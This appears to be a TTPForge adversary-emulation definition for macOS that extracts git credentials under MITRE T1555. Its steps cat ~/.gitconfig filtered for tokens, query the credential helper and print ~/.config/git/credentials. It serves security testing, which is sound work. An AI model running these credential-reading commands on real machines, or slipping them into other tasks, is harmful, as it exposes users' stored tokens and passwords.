api_version: 2.0
uuid: 12345678-1234-1234-1234-000000000012
name: Git Credentials Extraction
description: Extract stored git credentials and token configurations
author: TTPForge
created: 2025-01-30
tactics:
  - Credential Access
techniques:
  - T1555
requirements:
  platforms:
    - os: darwin
args:
  - name: git_config_dir
    description: Directory containing git configuration
    default: "~/.config/git"
  - name: output_file
    description: File to store extracted credentials
    default: "/tmp/git_creds.txt"
steps:
  - name: Check Git Config
    type: command
    command: "test -d {{ git_config_dir }} && echo 'Git config directory found' || test -f ~/.gitconfig && echo 'Global gitconfig found'"
    
  - name: Read Global Git Config
    type: command
    command: "cat ~/.gitconfig 2>/dev/null | grep -E 'user|email|token' | head -20 || echo 'No git config'"
    
  - name: Check Credentials Helper
    type: command
    command: "git config --global credential.helper 2>/dev/null || echo 'No credentials helper configured'"
    
  - name: Query Git Credentials
    type: command
    command: "cat ~/.config/git/credentials 2>/dev/null || echo 'No stored credentials'"

checks:
  - type: stdout_contains
    value: "git"
    description: Verify git configuration accessed

tests:
  - name: Check Git Configuration
    description: Access git configuration files
    test_type: default
    steps:
      - "test -f ~/.gitconfig && echo 'Gitconfig found' || echo 'Check complete'"

cleanup:
  - type: command
    command: "rm -f {{ output_file }}"
    description: Remove extracted git credentials
